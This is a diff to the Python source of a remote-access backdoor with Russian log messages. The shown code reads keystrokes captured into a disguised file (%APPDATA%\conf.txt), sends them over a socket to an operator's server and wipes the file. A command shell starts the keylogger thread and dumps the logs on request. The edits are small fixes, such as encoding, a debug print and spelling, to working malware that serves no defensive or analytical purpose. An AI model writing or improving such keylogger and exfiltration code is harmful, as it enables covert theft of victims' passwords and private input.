@@ -163,26 +163,23 @@ def send_keylog_file(sock):
     try:
         keylogger_path = os.path.join(os.environ["APPDATA"], "conf.txt")
         if not os.path.exists(keylogger_path):
-            logging.warning("[!!] Файл кейлогера отсутствует")
             reliable_send("[!!] Файл кейлогера отсутствует", sock)
             return
 
-        with open(keylogger_path, "r") as file:
+        with open(keylogger_path, "r", encoding="utf-8") as file:
             logs = file.read().strip()
+            print(f"Отправляемые логи: {logs}")  # Для отладки
             if logs:
                 reliable_send(logs, sock)
-                with open(keylogger_path, "w") as file:
+                with open(keylogger_path, "w", encoding="utf-8") as file:
                     file.write("")
                 logging.info("[+] Кейлог отправлен на сервер и очищен")
             else:
                 reliable_send("[!!] Кейлог пуст", sock)
-                logging.warning("[!!] Кейлог пуст")
-    except FileNotFoundError:
-        reliable_send("[!!] Файл кейлогера не найден", sock)
-        logging.error("[!!] Файл кейлогера не найден")
     except Exception as e:
         reliable_send(f"[!!] Ошибка при отправке кейлогов: {e}", sock)
         logging.error(f"[!!] Ошибка при отправке кейлогов: {e}")
+
 
 
 def shell(sock):
@@ -222,7 +219,7 @@ def shell(sock):
             elif command.startswith("keylog_start"):
                 t1 = threading.Thread(target=keylogger.start, daemon=True)
                 t1.start()
-                reliable_send("[+] Кейлогер запущен", sock)
+                reliable_send("[+] Кейлоггер запущен", sock)
             elif command.startswith("keylog_dump"):
                 send_keylog_file(sock)
             else:
